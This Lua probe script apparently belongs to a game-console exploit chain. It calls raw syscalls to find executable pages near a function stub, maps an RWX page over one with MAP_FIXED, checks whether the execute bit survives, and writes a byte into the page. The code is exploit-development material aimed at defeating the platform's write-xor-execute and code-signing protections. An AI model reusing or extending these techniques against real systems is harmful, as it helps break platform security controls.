-- CRASH_CLASS: MODERATE
-- PROBE 951a: MAP_FIXED over an existing executable mapping
--
-- 939e showed the X bit is dropped when mmap creates a *new* VM entry.
-- Open question: does replacing an existing entry with MAP_FIXED keep that
-- entry's execute permission, or build a fresh entry from the stripped prot?
-- sys 547 reports the recorded protection word, so the answer is readable
-- without executing anything.
--
-- Target pages are chosen from the eboot text around the fcall stub and are
-- checked with 547 first; only pages already recorded as executable are
-- replaced, and none of them is the stub page itself.

print("=== PROBE 951a: MAP_FIXED OVER EXEC ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(f, ...)
    local ok, rv = pcall(f, ...)
    if not ok then return nil end
    local h = 0
    if type(rv) == "table" and rv.h then h = to_num(rv.h) end
    return to_num(rv), h
end

local sc477 = make_syscall(477)
local sc547 = make_syscall(547)
local PAGE = 0x4000

local info = tostring(syscall.pipe)
local fn = info:match("fn_addr: (0x[0-9a-fA-F]+)")
if not fn then
    print("[!] cannot read fn_addr from syscall.pipe")
    return
end
local fn_num = tonumber(fn)
print(string.format("[0] fn_addr = 0x%X", fn_num))
print("")

local function entry(addr)
    local out = memory.alloc(0x20)
    for i = 0, 0x18, 8 do memory.write_qword(out + i, 0) end
    local rv = call(sc547, uint64(addr), uint64(out))
    if rv ~= 0 then return nil end
    local start = to_num(memory.read_qword(out))
    local ended = to_num(memory.read_qword(out + 8))
    local w0 = to_num(memory.read_qword(out + 0x10))
    local w1 = to_num(memory.read_qword(out + 0x18))
    return start, ended, w0, w1
end

print("--- A: find executable pages around eboot text ---")
local targets = {}
for _, delta in ipairs({0x40000, 0x60000, 0x80000, 0xA0000, 0xC0000}) do
    local t = (fn_num - delta) - ((fn_num - delta) % PAGE)
    local s, e, lo, hi = entry(t)
    if s then
        local prot = lo % 0x100000000
        print(string.format("  page 0x%X: start=0x%X end=0x%X lo=0x%X hi=0x%X", t, s, e, prot, hi))
        if prot == 4 or prot == 5 or prot == 6 or prot == 7 then
            targets[#targets + 1] = t
        end
    else
        print(string.format("  page 0x%X: 547 failed", t))
    end
end
print("")

if #targets == 0 then
    print("[!] no executable page found; stopping")
    return
end

print("--- B: MAP_FIXED RWX over the first executable page ---")
local target = targets[1]
local before = { entry(target) }
print(string.format("  before: lo=0x%X hi=0x%X", before[3] % 0x100000000, before[4]))
local rv = call(sc477, uint64(target), uint64(PAGE), uint64(7),
                uint64(0x1002 + 0x10), uint64(0xFFFFFFFF), uint64(0))
print(string.format("  mmap(MAP_FIXED|MAP_ANON) ret=%s", tostring(rv)))
local after = { entry(target) }
if after[1] then
    print(string.format("  after:  lo=0x%X hi=0x%X", after[3] % 0x100000000, after[4]))
    local prot = after[3] % 0x100000000
    if prot >= 4 then
        print("  *** REPLACEMENT ENTRY KEEPS X ***")
    else
        print("  replacement entry has no X bit (fresh entry from stripped prot)")
    end
else
    print("  after: 547 failed")
end
print("")

print("--- C: write and read back the replacement page ---")
local ok_w = pcall(function() memory.write_byte(target, 0xC3) end)
local ok_r, val = pcall(function() return memory.read_byte(target) end)
print(string.format("  write ret=%s read=%s", tostring(ok_w), tostring(ok_r and val or "fail")))

print("")
print("=== PROBE 951a COMPLETE ===")
